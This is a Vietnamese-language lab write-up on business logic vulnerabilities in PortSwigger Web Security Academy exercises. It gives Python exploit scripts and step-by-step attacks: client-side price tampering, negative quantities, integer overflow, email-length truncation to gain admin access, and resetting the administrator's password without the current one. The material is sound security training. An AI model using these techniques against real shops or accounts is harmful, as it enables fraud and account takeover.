# Business logic vulnerabilities

## Khái niệm & Nguyên nhân & Phòng tránh

### Khái niệm

- BLV là các lỗ hổng xuất phát từ các sai sót trong logic quy trình làm việc của ứng dụng, chứ không phải là các điểm yếu trong mã hoặc cơ chế bảo mật của ứng dụng đó. Các lỗ hổng này khai thác cách ứng dụng xử lý dữ liệu và đưa ra quyết định, thường dẫn đến truy cập trái phép, vi phạm dữ liệu hoặc các hoạt động độc hại khác.
- Bên cạnh các hậu quả dẫn tới leo thang đặc quyền, kẻ xấu thường lợi dụng các lỗ hổng Business logic để trục lợi cho bản thân, mang lại hậu quả khôn lường cho các doanh nghiệp. Nếu ảnh hưởng của lỗ hổng nhỏ, kẻ tấn công có thể chỉ lợi dụng nó để mua sắm sản phẩm miễn phí. Nếu đó là một lỗ hổng nghiêm trọng, kẻ tấn công có thể khai thác với mục đích phá hoại quy trình hoạt động của toàn hệ thống, chuyển tiền trái phép với số lượng lớn, dẫn tới tổn thất lớn lao đến doanh nghiệp cũng như khách hàng.

### Nguyên nhân

1. Bỏ qua xác thực
   - Hệ thống xác thực là tuyến phòng thủ đầu tiên cho bất kỳ ứng dụng web nào. Lỗ hổng Bỏ qua xác thực cho phép kẻ tấn công truy cập trái phép vào các khu vực bị hạn chế của ứng dụng mà không có thông tin xác thực hợp lệ. Điều này có thể xảy ra do sai sót trong quá trình đăng nhập hoặc quản lý phiên
2. Kiểm tra ủy quyền không đầy đủ
   - Ngay cả khi người dùng được xác thực thành công, điều đó không có nghĩa là họ có quyền truy cập vào tất cả các phần của ứng dụng. Kiểm tra ủy quyền không đầy đủ xảy ra khi ứng dụng không xác minh được liệu người dùng có các quyền cần thiết để thực hiện một hành động cụ thể hay không, có khả năng cấp các đặc quyền không chính đáng.

### Phòng tránh

- Để phòng chống các dạng lỗ hổng Business logic, chúng ta thường tập trung vào phía nhà cung cấp dịch vụ. Qua đó, chúng ta có một số điều cần lưu ý sau:

  - Các nhà phát triển sản phẩm cũng như đội ngũ kiểm tra, bảo trì sản phẩm cần hiểu rõ từng cơ chế hoạt động trong mỗi tính năng.
  - Mã nguồn cần được viết rõ ràng, rành mạch, mỗi đoạn mã với vai trò riêng cần được comment chi tiết, dễ hiểu.
  - Xử lý đầy đủ, chặt chẽ các trường hợp ngoại lệ xảy ra từ phía đầu vào người dùng.
  - Khi phát triển các tính năng mới cho sản phẩm, cần xem xét các trường hợp đặc biệt, sự xung đột ngoại lệ có thể xảy ra khi kết hợp với tính năng cũ.
  - Thường xuyên cập nhật các phiên bản mới nhất của công nghệ sử dụng, thực hiện các công việc kiểm thử, bảo trì sản phẩm đầy đủ.
  - chỉ nên cho phép người dùng có quyền thay đổi các tham số trong phạm vi "an toàn". Một trong những số liệu quan trọng là giá bán sản phẩm nên lấy từ trong cơ sở dữ liệu, không nên lấy giá trị từ phía client truyền lên, bởi đó có thể một giá trị đã bị chỉnh sửa.

![image](https://hackmd.io/_uploads/rJS9LSMna.png)

## 1. Lab: Excessive trust in client-side controls

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

### Đề bài

![image](https://hackmd.io/_uploads/r1xFUHzn6.png)

### Phân tích

- Lab này sẽ không kiểm tra đầu vào của người dùng 1 cách kỹ lưỡng và đầy đủ, tạo điều kiện cho ta có thể khai thác, từ đó mua những vật phẩm với giá thành ko như dự định.
- Để solve được lab, hãy mua 1 chiếc "Lightweight l33t leather jacket".
- Ta được cấp tài khoản và mật khẩu của bản thân: wiener:peter
- Sau khi đăng nhập bằng tài khoản wiener:peter, account có 100$ để mua sắm. Tuy nhiên, để mua Lightweight l33t leather jacket, tài khoản cần có ít nhất 1337$.

![image](https://hackmd.io/_uploads/r1ks0NG3a.png)

Quy trình mua một sản phẩm như sau:

- Bước 1: Vào xem chi tiết một sản phẩm (chọn View details dưới sản phẩm tương ứng).
- Bước 2: Thêm sản phẩm vào giỏ hàng bằng cách chọn Add to cart

![image](https://hackmd.io/_uploads/BJSURVM3T.png)

- Bước 3: Vào giỏ hàng đặt hàng với tùy chọn Place order

![image](https://hackmd.io/_uploads/SJ-A04M2T.png)

khi mình ctrl +u để đọc sourceở view detail thì thấy có trường nhập vào số lượng sản phẩm min là 0 và max là 99
cùng với đó là giá tiền 133700 là trường bị ẩn cho sản phầm này

![image](https://hackmd.io/_uploads/SyzDkSM36.png)

- khi nhấn add to card thì thông tin trong form này sẽ được gửi trực tiếp đến server và không đi qua bước kiểm tra nào

![image](https://hackmd.io/_uploads/SywOREz36.png)

- Điều này có nghĩa là, trang web thiết lập giá trị sản phẩm trực tiếp trong source code front-end gắn liền với từng sản phẩm. Tại bước xử lý đơn hàng sẽ trực tiếp lấy giá trị sản phẩm từ client. Bởi vậy chúng ta có thể thay đổi giá trị tham số này để mua sản phẩm "Lightweight l33t leather jacket" với giá tùy ý, chẳng hạn mua với giá $0.01

### Khai thác

- mình sửa giá tiền thành 1 và gửi thành công

![image](https://hackmd.io/_uploads/B15s-SMnp.png)

và lúc này giá tiền của sản phẩm chỉ là 0.01$

![image](https://hackmd.io/_uploads/HkVyzHG3T.png)

mình nhấn mua, chọn Place order để đặt hàng và solve được lab này

mình đã viết script khai thác

```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a8500de04771947816b993800f30058.web-security-academy.net'

session=requests.Session()

response = session.get(
    url +'/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url+'/login',
    data=data,
    verify=False,
    allow_redirects=False
)

data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1',
    'price': '1',
}

response = session.post(
    url + '/cart',
    data=data,
    verify=False,
    allow_redirects=False
)

response = session.get(
    url + '/cart',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
}

response = session.post(
    url + '/cart/checkout',
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Syyc7BG3a.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HJeoESGna.png)

## 2. Lab: High-level logic vulnerability

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

### Đề bài

![image](https://hackmd.io/_uploads/ryhdhTG36.png)

### Phân tích

- Trang web mua sắm trên có một quá trình kiểm tra không chặt chẽ đối với tham số từ người dùng, dẫn đến lỗ hổng có thể mua sắm sản phẩm với số lượng ngoài mong muốn. Để vượt qua bài lab, chúng ta cần mua thành công sản phẩm "Lightweight l33t leather jacket". Tài khoản hợp lệ được cung cấp: `wiener:peter`.
- truy cập vào sản phẩm thấy trong form ở phần số lượng không giới hạn số lượng mua, chúng ta có thể thêm món hàng vào giỏ với số lượng tùy ý, tuy nhiên trang web thiết lập trị nhỏ nhất bằng 0.
  ![image](https://hackmd.io/_uploads/BJ3zp6GhT.png)

Nghĩa là trong front-end server chúng ta không thể thêm sản phẩm vào giỏ với số lượng nhỏ hơn 0:

![image](https://hackmd.io/_uploads/ryG8RpGnp.png)

Tuy nhiên, dự đoán điều này chỉ được quy ước ở front-end server, rất có thể back-end server không kiểm tra điều này.

### Khai thác

- mình thử thay đổi giá trị tham số quanlity qua Burp Suite, chúng ta nhận được phản hồi mong muốn:

![image](https://hackmd.io/_uploads/S1b3R6zha.png)

Sản phẩm với số lượng -100 đã được thêm vào giỏ hàng, khi đó giá mua cũng sẽ có giá trị âm:

![image](https://hackmd.io/_uploads/Hya6CpGnp.png)

Đặt hàng với tùy chọn Place order và hoàn thành bài lab.

với hướng khác mình có thể nhập 1 số nguyên dương lớn để tràn số nguyên và nó sẽ quay trở về giá trị âm nhưng khi nhập số lượng 10^9^ ![image](https://hackmd.io/_uploads/rkLtgCfnT.png)

đơn hàng vẫn được chấp nhận nhưng khi sang 10^10^ đã xảy ra thông báo lỗi có thể cách này đã bị chặn

![image](https://hackmd.io/_uploads/BJQ0x0Mha.png)

mình đã viết lại script khai thác

```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ad700f904cafb078179523400f10052.web-security-academy.net'

response = requests.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + '/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1'
}

response = requests.post(
    url + '/cart',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

data = {
    'productId': '4',
    'redir': 'PRODUCT',
    'quantity': '-37'
}

response = requests.post(
    url + '/cart',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

response = requests.get(
    url + '/cart',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
}

response = requests.post(
    url + '/cart/checkout',
    cookies=cookies,
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Hkfv40GnT.png)

mục đích của chúng ta đã hoàn thành

![image](https://hackmd.io/_uploads/HJFCVAfnp.png)

## 3. Lab: Low-level logic flaw

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level

### Đề bài

![image](https://hackmd.io/_uploads/SkmBBRM2T.png)

### Phân tích

- Trang web mua sắm trên có một quá trình kiểm tra không chặt chẽ đối với tham số từ người dùng, dẫn đến lỗ hổng có thể mua sắm sản phẩm với số lượng ngoài mong muốn. Để vượt qua bài lab, chúng ta cần mua thành công sản phẩm "Lightweight l33t leather jacket". Tài khoản hợp lệ được cung cấp: wiener:peter.

- khi mình nhập vào ÂM số lượng hàng hóa, nếu số lượng hàng hóa < hoặc = 0, nó sẽ xóa mặt hàng đó khỏi giỏ hàng
- khi mình thử nhập quantity lớn (1000; 100; …) nó lại ghi là giá trị không thỏa mãn, số 99 là số to nhất thỏa mã số lượng mua

![image](https://hackmd.io/_uploads/H1m4IAG36.png)

- trang web không cho phép số lượng món hàng nhận giá trị âm ở cả front-end server và back-end server:

- Trang web chỉ cho phép tăng số lượng đơn hàng tối đa bằng 99, nếu vượt quá 99 sẽ nhận về thông báo lỗi

![image](https://hackmd.io/_uploads/Bk86ICfnT.png)

- vậy tham số quantity có giới hạn, chúng ta có thể dự đoán giá trị total price cũng tồn tại giới hạn.

- Như vậy ta có thể tăng số lượng đơn hàng liên tục vì mỗi lần chỉ được đặt max 99, mục đích để tổng giá trị sản phẩm vượt ngưỡng giới hạn trên, khi đó bộ đếm sẽ quay vòng và bắt đầu từ giá trị âm.
- Ta gửi vô số request để tổng hóa đơn tràn sang số âm.

### Khai thác

- mình sang intruder để thực hiện tự động

![image](https://hackmd.io/_uploads/r1emiCf2a.png)

Gửi request với null payload.

![image](https://hackmd.io/_uploads/HJMEo0G2a.png)

- repress trang `/cart` liên tục để trờ đợi giá trị của số sản phầm này tràn sang số âm

![image](https://hackmd.io/_uploads/Sy-nDJmnT.png)

- Quả đúng như dự đoán, chắc chắn người code trang web đã để giới hạn INT hoặc tương tự cho đơn vị total này, vì `số lượng áo * 1337$` đã vượt quá giới hạn INT, từ đó nó trả về cho mình giá trị âm

![image](https://hackmd.io/_uploads/r1Uva0z26.png)

Lúc này ta sẽ mua sản phẩm khác có giá tiền bé hơn với số lượng lớn sao cho 0$ ≤ tổng tiền ≤ 100$.

![image](https://hackmd.io/_uploads/Bk5NXk726.png)

cho 2 tiến trình chạy song song và tiếp tục trờ đợi

![image](https://hackmd.io/_uploads/BJVMwkQhT.png)

trờ đợi được khoản tiền có thể trả và chúng ta thanh toán

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/rkYrvym2p.png)

## 4. Lab: Inconsistent handling of exceptional input

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input

### Đề bài

![image](https://hackmd.io/_uploads/HJlP5k7n6.png)

### Phân tích

- Trang web có một quá trình kiểm tra không chặt chẽ đối với tham số từ người dùng. Chúng ta cần khai thác để có thể truy cập vào trang quản trị và xóa tài khoản người dùng Carlos.
- mình dùng dirsearch thấy được trang /admin

![image](https://hackmd.io/_uploads/S1sNik72T.png)

- Trang web yêu cầu chúng ta cần có vai trò là DontWannaCry user.

chúng ta sẽ có thể có quyền truy cập đến admin panel bằng tài khoản của nhân viên Dontwannacry

- chúng ta có mail

![image](https://hackmd.io/_uploads/By7MbgQ3p.png)

Thông qua trang đăng ký, để trở thành người dùng có vai trò DontWannaCry, email cần có địa chỉ @dontwannacry.com.

![image](https://hackmd.io/_uploads/rygxnkm3T.png)

mình đăng kí một email có dạng `a@exploit-0aca007b0450cfd98410ea2901260099.exploit-server.net`

Truy cập đến đường dẫn server trả về token registration

![image](https://hackmd.io/_uploads/ry-5akQhp.png)

đăng nhập và mình có được tài khoản 123

![image](https://hackmd.io/_uploads/BJ1Z0172a.png)

Có một lưu ý nữa là ta vẫn có thể nối chuỗi email của mình vào sau @dontwannacry.com để gửi về email client vì email của ta accept các sub domains:

chúng ta cần đăng kí một email có dạng `A@dontwannacry.com.exploit-0aca007b0450cfd98410ea2901260099.exploit-server.net`

nhưng làm sao để chúng ta vẫn có mail gửi đến để kích hoạt token mà vẫn được hệ thống công nhận có mail với đuôi `@dontwannacry.com`

mình thử chèn chuỗi email dài vào vẫn thành công

![image](https://hackmd.io/_uploads/rklCRym2T.png)

![image](https://hackmd.io/_uploads/rylJxl72a.png)

nhưng khi đăng nhập vào tài khoản 1234 này thì đoạn email đã bị cắt , kiểm tra length của đoạn này thì chỉ còn 255 kí tự, vậy là giới hạn input cho email là 255

![image](https://hackmd.io/_uploads/SJ8OZeQ2a.png)

### Khai thác

- chúng ta hoàn toàn có thể tiến hành khai thác bằng khác chèn thêm sao cho sau khi lên server nó chỉ còn đoạn gmai; @dontwannacry.com, còn đoạn nối đến email của mình thì sẽ nhồi thêm ở ngoài
- Thay thế các ký tự cuối bằng @dontwannacry sao cho vẫn vừa khít 255 kí tự

![image](https://hackmd.io/_uploads/rkY0QxQhT.png)

và sau đấy mình nối email của mình vào và có được payload

```xml!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0aca007b0450cfd98410ea2901260099.exploit-server.net
```

và mình gửi request chứa email vừa tạo

![image](https://hackmd.io/_uploads/Sy08Nxm2a.png)

kích hoạt token

![image](https://hackmd.io/_uploads/BJD64e73T.png)

và mình đăng nhập được vào tài khoản

![image](https://hackmd.io/_uploads/SJb5NeX36.png)

- sau khi login server truncate còn đúng 255 ký tự chứa mail của nhân viên dontwannacry, admin panel hiện ra ngay trước mặt

xóa carlos và mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/ryBTBx7hp.png)

mình đã viết script khai thác

```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ae300b9031632b481e6a70200260035.web-security-academy.net'

response = requests.get(url + '/register')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post register

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'a',
    'email': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0a9600890419dc4cc13d35cd019700fc.exploit-server.net',
    'password': 'a',
}

response = requests.post(
    url + '/register',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

# Get link from email

response = requests.get(
    'https://exploit-0a8e00ac038e32978191a620011b00ed.exploit-server.net/email',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
link = soup.find_all('a')[2]['href']
print(link)

# Get link to confirm register

response = requests.get(
    link,
    cookies=cookies,
    verify=False,
)

response = requests.get(
    url + '/register',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']


data = {
    'csrf': csrf,
    'username': 'a',
    'password': 'a',
}
session = requests.Session()
response = session.post(
    url + '/login',
    data=data,
    cookies=cookies,
    allow_redirects=False,
    verify=False,
    )

session = response.headers
print(session)


cookies = {
    'session': session,
}

response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

## 5. Lab: Inconsistent security controls

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls

### Đề bài

![image](https://hackmd.io/_uploads/ryzmfrQ36.png)

### Phân tích

- trang web xác thực danh tính quản trị viên với email nội bộ. Tuy nhiên đang có một lỗ hổng logic flaw khiến người dùng thông thường có thể truy cập trang quản trị. Chúng ta cần truy cập vào trang quản trị và xóa đi tài khoản người dùng Carlos.

- mình dùng dirsearch thấy được trang /admin
  chúng ta sẽ có thể có quyền truy cập đến admin panel bằng tài khoản của nhân viên Dontwannacry

![image](https://hackmd.io/_uploads/SydIQH7ha.png)

- chúng ta có mail

![image](https://hackmd.io/_uploads/SyTVmHX3p.png)

trang web không còn chứa lỗ hổng logic flaw trong đăng ký tài khoản. Tuy nhiên, sau khi đăng nhập, lưu ý chức năng đổi email cho người dùng:

![image](https://hackmd.io/_uploads/r1BDVS72T.png)

![image](https://hackmd.io/_uploads/BkI8NHQ36.png)

### Khai thác

Chúng ta có thể đổi email tùy ý mà không bị ràng buộc bởi điều kiện gì. Thực hiện đổi email có địa chỉ @dontwannacry.com, có được vai trò quản trị viên:

![image](https://hackmd.io/_uploads/rySKSSXha.png)

thực hiện xóa carlos và mình solve được lab này

![image](https://hackmd.io/_uploads/HJyqSSQ2p.png)

![image](https://hackmd.io/_uploads/B1rFwB736.png)

## 6. Lab: Weak isolation on dual-use endpoint

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint

### Đề bài

![image](https://hackmd.io/_uploads/rJvL_BmhT.png)

### Phân tích

- Trang web chứa lỗ hổng logic trong việc xử lý input người dùng. Chúng ta có thể khai thác nó dẫn tới việc truy cập được tài khoản administrator. Xóa tài khoản người dùng Carlos để hoàn thành bài lab. Tài khoản hợp lệ được cung cấp `wiener:peter`.
- Sau khi đăng nhập, tại trang /my-account có chức năng đổi password cho user.

![image](https://hackmd.io/_uploads/Bk14YrXnT.png)

Thử cập nhật password mới thành công. Có 4 trường cần điền thông tin:

- username: user cần đổi mật khẩu, mặc định sẽ là user hiện tại và không thay đổi được trên front-end.
- current-password: mật khẩu hiện tại
- new-password-1: mật khẩu mới
- new-password-2: confirm mật khẩu mới

Chúng ta cần hoàn thiện thông tin các trường username, current password, new passwrod, confirm new password, và quan sát source biết rằng tất cả các trường này đều là bắt buộc:

![image](https://hackmd.io/_uploads/HkQpFSXn6.png)

trang web cho mình nhập username để update lại password vậy mình có thể diền vào username là administrator và cập nhập mật khẩu của admin nhưng vấn đề là chúng ta không biết mật khẩu hiện tại của admin

### Khai thác

mình thử xóa bỏ trường `current password ` và update password của wiener vẫn thành công

![image](https://hackmd.io/_uploads/Hk7bsrQ3T.png)

vậy là ở front-end server, các tham số này đều mang tính bắt buộc, nhưng chúng ta có thể bỏ đi một vài tham số tại back-end server do bên backend đã tin tưởng với validate ở frontend và ở phần logic xử lý backend xử lý không đúng với `current password`

![image](https://hackmd.io/_uploads/Bkughrm2T.png)

mình đổi lại mật khẩu của admin là 123 và giwof chúng ta có thể đăng nhập tài khoản **administrator:123** và xóa người dùng carlos

![image](https://hackmd.io/_uploads/SJ5ShSmh6.png)

mình đã viết script khai thác

```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

session = requests.Session()
url = 'https://0a85007603d8768180763f2700cb002a.web-security-academy.net'

response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

response = session.get(
    url + '/my-account',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'administrator',
    'new-password-1':'peter',
    'new-password-2':'peter',
}

response = session.post(
    url + '/my-account/change-password',
    data=data,
    verify=False,
)

response = session.get(
    url + '/logout',
    verify=False,
)

sess = requests.Session()
response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'administrator',
    'password': 'peter',
}

response = sess.post(
    url + '/login',
    data=data,
    verify=False,
)

response = sess.get(
    url + '/admin/delete?username=carlos',
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/SyVzkIm2T.png)

## 7. Lab: Insufficient workflow validation

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation

### Đề bài

![image](https://hackmd.io/_uploads/ryQx-FQ3p.png)

### Phân tích

- Trang web chứa lỗ hổng logic trong các bước của quá trình mua hàng. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng để mua sản phẩm "Lightweight l33t leather jacket". Tài khoản hợp lệ được cung cấp: wiener:peter.

Khi ta mua một sản phẩm thành công, tồn tại 2 request như sau:

- POST /cart/checkout: request thanh toán
- GET /cart/order-confirmation?order-confirmed=true: request confirm các sản phẩm đã mua.

### Khai thác

- Tuy nhiên, ứng dụng bị dính lỗi logic khi có thể mua sản phẩm không mất tiền bằng cách gửi luôn request GET /cart/order-confirmation?order-confirmed=true và bỏ request POST /cart/checkout.

đầu tiên mình mua sản phẩm như bình thường

![image](https://hackmd.io/_uploads/BJ50Gt736.png)

sau đó add sản phẩm "Lightweight "l33t" Leather Jacket" vào giỏ hàng

![image](https://hackmd.io/_uploads/H1IZXKmn6.png)

và mình nhấn gửi "/cart/order-confirmation?order-confirmed=true"

![image](https://hackmd.io/_uploads/BkumQK7h6.png)

và mình đã solve được lab này lab đã mặc định trải qua POST /cart/checkout: request thanh toán mới đến /cart/order-confirmation?order-confirmed=true nên chúng ta đã bỏ qua bước đầu mà đến luôn bước confirm

![image](https://hackmd.io/_uploads/SJ5HQYXn6.png)

## 8. Lab: Authentication bypass via flawed state machine

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine

### Đề bài

![image](https://hackmd.io/_uploads/r1HAHYX2T.png)

### Phân tích

- Trang web chứa lỗ hổng logic trong các bước của quá trình xác thực. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng để truy cập tài khoản admin, từ đó xóa tài khoản người dùng Carlos. Tài khoản hợp lệ được cung cấp: wiener:peter.
- Sau khi đăng nhập, ứng dụng sẽ cho chọn role là User hoặc Content author.
- ![image](https://hackmd.io/_uploads/Sy8UUFm36.png)

### Khai thác

Tuy nhiên, nếu sau khi đăng nhập, mình bỏ bước chọn role này bằng cách drop luôn gói tin GET /role-selector, thì mặc định lúc này, user mình vừa đăng nhập sẽ trở thành administrator.

![image](https://hackmd.io/_uploads/SJPkPKQnp.png)

![image](https://hackmd.io/_uploads/SkjydFmnT.png)

![image](https://hackmd.io/_uploads/SJbWdY73a.png)

Xóa tài khoản người dùng Carlos và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/SJ5fOtX2T.png)

## 9. Lab: Flawed enforcement of business rules

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules

### Đề bài

![image](https://hackmd.io/_uploads/HJwaOFXh6.png)

### Phân tích

- Trang web mua sắm chứa lỗ hổng logic trong chức năng thanh toán với voucher. Chúng ta cần khai thác lỗ hổng để mua sắm sản phẩm "Lightweight l33t leather jacket". Tài khoản hợp lệ được sử dụng: wiener:peter.

chúng ta sẽ có 2 couponn như sau:

- Một coupon `NEWCUST5` cho khách hàng mới, khi mua sẽ được giảm 5$

![image](https://hackmd.io/_uploads/BJyRYt7n6.png)

- Một coupon `SIGNUP30` khi sign up để nhận thông tin. Khi mua sản phẩm có coupon này, hóa đơn sẽ được giảm 30%.

![image](https://hackmd.io/_uploads/HJA09tmna.png)

![image](https://hackmd.io/_uploads/ry7KiKm36.png)

Thực hiện mua sản phẩm "Lightweight l33t leather jacket". Khi dùng coupon NEWCUST5 thì sẽ được giảm 5$. Nếu apply coupon này 2 lần liên tiếp sẽ bị báo Coupon already applied.

![image](https://hackmd.io/_uploads/SJAAiY7ha.png)

### Khai thác

- Tuy nhiên, nếu apply thêm coupon SIGNUP30 rồi apply lại NEWCUST5 thì lại thành công. Điều này chứng tỏ số lần apply coupon liên tiếp sẽ bị reset khi apply coupon khác thành công.

![image](https://hackmd.io/_uploads/BkONnFmha.png)

Dựa vào đó, ta sẽ apply 2 coupon trên một cách xen kẽ cho đến khi tổng hóa đơn có giá trị nằm trong khoảng 0$-100$.

![image](https://hackmd.io/_uploads/BJvd2Ymhp.png)

Thực hiện thanh toán và mình solve được challenge.

![image](https://hackmd.io/_uploads/r1Rd3YXnp.png)

## 10. Lab: Infinite money logic flaw

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

### Đề bài

![image](https://hackmd.io/_uploads/B1p1TF736.png)

### Phân tích

- Trang web mua sắm chứa lỗ hổng logic trong chức năng thanh toán với voucher. Chúng ta cần khai thác lỗ hổng để mua sắm sản phẩm "Lightweight l33t leather jacket". Tài khoản hợp lệ được sử dụng:wiener:peter.

Giống với lab trên, tình huống này chúng ta cũng có voucher SIGNUP30 giảm giá 30% đơn hàng, lấy voucher tại cuối trang chủ:

![image](https://hackmd.io/_uploads/SyOIaYX26.png)

khi đăng nhập mình thấy có phần nhập Gift cards code

![image](https://hackmd.io/_uploads/BJS06tQ2T.png)

Ngoài ra, trang web có một món hàng đáng chú ý là Gift card:
Có thể mua sản phẩm Gift card với giá 10$

![image](https://hackmd.io/_uploads/HkCgAYX36.png)

mình mua nó và nhận được code

![image](https://hackmd.io/_uploads/B1x4RYX26.png)

Chúng ta thu được một mã code, khi nhập code này tại trang đặt hàng sẽ được hoàn trả 10$ vào tài khoản.

![image](https://hackmd.io/_uploads/H1FKAKXh6.png)

Để ý rằng chúng ta có voucher SIGNUP30 sử dụng sẽ giảm giá 30% giá trị sản phẩm. Như vậy chúng ta có thể sử dụng nó trong việc mua sản phẩm Gift card (với giá 7$), sau đó nhập code để được hoàn trả 10$, dẫn đến mỗi lần thực hiện chúng ta được tặng miễn phí 3$. Nếu voucher SIGNUP30 có thể được sử dụng lại nhiều, thì tài khoản của chúng ta sẽ tăng vĩnh viễn.

### Khai thác

Như vậy chỉ cần thực hiện mua gift card và apply mã code vô số lần, tài khoản của mình sẽ được cộng tiền một cách vô hạn. Ta sẽ sử dụng Intruder để gửi vô số request kèm theo 1 macro. Macro sẽ thực hiện các request lần lượt như sau:

POST /cart - Thêm gift card vào giỏ hàng
POST /cart/coupon - Apply mã coupon SIGNUP30
POST /cart/checkout - Thanh toán
GET /cart/order-confirmation?order-confirmed=true - Đây là bước confirm đơn hàng sau khi mua
POST /gift-card - Thực hiện submit gift code để được hoàn tiền

Và chúng ta chỉ cần đợi tới khi số dư trong ví lớn hơn 1337$ là có thể đặt hàng

## 11. Lab: Authentication bypass via encryption oracle

link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle

### Đề bài

![image](https://hackmd.io/_uploads/H1PA19mhp.png)

### Phân tích

